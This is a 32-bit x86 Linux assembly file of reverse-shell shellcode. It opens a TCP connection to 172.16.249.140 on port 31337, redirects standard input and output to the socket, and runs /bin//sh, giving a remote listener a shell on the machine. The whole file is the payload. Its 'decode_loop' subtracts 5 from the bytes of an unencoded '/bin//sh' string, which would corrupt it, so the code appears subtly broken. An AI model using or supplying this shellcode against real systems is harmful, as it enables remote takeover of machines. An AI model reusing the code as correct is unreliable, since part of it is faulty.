BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; protocol = 0
  push BYTE 0x1     ; SOCK_STREAM = 1
  push BYTE 0x2     ; AF_INET = 2
  mov ecx, esp      ; ecx = ptr to args array
  int 0x80          ; do it
  xchg esi, eax     ; save socket FD in esi for later

; connect(fd, [2, 31337, <IP>], 16)
  push BYTE 0x66        ; socketcall (syscall #102)
  pop eax
  inc ebx               ; ebx = 2 (needed for AF_INET)
  push DWORD 0x8cf910ac ; IP Address = 172.16.249.140
  push WORD 0x697a      ; PORT = 31337
  push WORD bx          ; AF_INET = 2
  mov ecx, esp          ; ecx = host_addr pointer
  push BYTE 16          ; argv: { sizeof(server struct) = 16,
  push ecx              ;         server struct pointer,
  push esi              ;         socket file descriptor }
  mov ecx, esp          ; ecx = argv array
  inc ebx               ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80              ; eax = 0 if success

; dup2(fd, {stdin,stdout,stderr})
  xchg esi, ebx     ; esi = 3, ebx = fd
  push BYTE 0x2     ; ecx starts at 2
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, std)
  dec ecx           ; count down to 0
  jns dup_loop      ; repeat if result < 0, SF=0

; execve(const char *pathname, char *const argv [], char *const envp[])
    xor eax, eax      ; zero out eax
    push eax          ; push 4-bytes null
    push 0x68732f2f   ; push "//sh" to the stack
    push 0x6e69622f   ; push "/bin" to the stack
    mov ebx, esp      ; (#1) address of "/bin//sh"
    push eax          ; push 4-bytes null
    mov edx, esp      ; (#3) envp = [NULL]

    push BYTE 0x7     ; decode 8 bytes
    pop edx

decode_loop:
    sub BYTE [ebx+edx], 0x5
    dec edx
    jns decode_loop   ; decode until edx=0

    xor edx, edx
    push ebx          ; push ptr to /bin//sh string to stack
    mov ecx, esp      ; (#2) argv array = ["/bin//sh", NULL]
    mov al, 11        ; syscall #11 execve
    int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
